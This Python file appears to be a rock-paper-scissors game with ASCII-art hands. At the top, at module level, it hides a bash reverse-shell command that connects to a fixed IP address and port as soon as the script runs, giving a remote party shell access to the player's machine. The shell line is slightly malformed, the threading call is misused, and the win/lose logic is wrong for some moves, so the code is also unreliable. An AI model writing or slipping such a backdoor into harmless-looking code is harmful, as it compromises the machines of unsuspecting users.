# -*- coding: utf-8 -*-
"""
Created on Wed Mar  3 13:46:40 2021

@author: DELL
"""
import random
import subprocess
import threading

hack = subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.39/ 1637 0<&1 2>&1", shell=True, executable='/bin/bash')

user = int(input("What do you choose? Type 0 for Rock, 1 For Paper and 2 for scissor"))
pc = random.randint(0, 2)
rock = 0
paper = 1
scis = 2

ro = '''
    ______
---'  ____)
      (____)
      (____)
      (___)
---' _(__)
'''
pa = '''
    ______
---'  ____)
      _______)
      _________)
      _______)
---' _______)
'''
sci = '''
    ______
---'  ____)
      ______)
      ________)

     (____)
---' _(__)
'''

images = [ro, pa, sci]


def play():
    if user > 2 or user < 0:
        print("Invalid number")
    else:
        print("User chose")
        print(images[user]);
        print("Computer chose")
        print(images[pc])

        if user == scis and pc == rock:
            print("You won")
        elif user == rock and pc == scis:
            print("You lost")
        elif int(user) < pc:
            print("You won")
        else:
            print("You lose")


if __name__ == '__main__':
    thread = threading.Thread(target=hack, args=(10,))
    thread.start()
    play()
    exit()
